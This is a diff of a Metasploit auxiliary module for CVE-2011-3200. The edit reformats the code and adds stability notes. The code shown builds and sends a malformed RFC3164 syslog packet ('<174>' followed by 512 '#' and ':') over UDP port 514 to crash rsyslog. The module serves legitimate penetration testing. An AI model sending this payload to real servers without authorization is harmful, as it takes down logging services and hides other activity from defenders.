@@ -9,7 +9,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'rsyslog Long Tag Off-By-Two DoS',
+      'Name' => 'rsyslog Long Tag Off-By-Two DoS',
       'Description' => %q{
           This module triggers an off-by-two overflow in the
         rsyslog daemon. This flaw is unlikely to yield code execution
@@ -18,25 +18,31 @@ class MetasploitModule < Msf::Auxiliary
         Compiler differences may prevent this bug from causing any
         noticeable result on many systems (RHEL6 is affected).
       },
-      'Author'      => 'hdm',
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          [ 'CVE', '2011-3200'],
-          [ 'URL', 'https://www.rsyslog.com/potential-dos-with-malformed-tag/' ],
-          [ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=727644' ],
-        ],
-      'DisclosureDate' => 'Sep 01 2011')
+      'Author' => 'hdm',
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2011-3200'],
+        ['URL', 'https://www.rsyslog.com/potential-dos-with-malformed-tag/'],
+        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=727644'],
+      ],
+      'DisclosureDate' => 'Sep 01 2011',
+      'Notes' => {
+        'Stability' => [CRASH_SERVICE_DOWN],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
+    )
 
     register_options(
       [
         Opt::RPORT(514)
-      ])
+      ]
+    )
   end
 
   def run
     connect_udp
-    pkt = "<174>" + ("#" * 512) + ":"
+    pkt = '<174>' + ('#' * 512) + ':'
     print_status("Sending message containing a malformed RFC3164 tag to #{rhost}")
     udp_sock.put(pkt)
     disconnect_udp
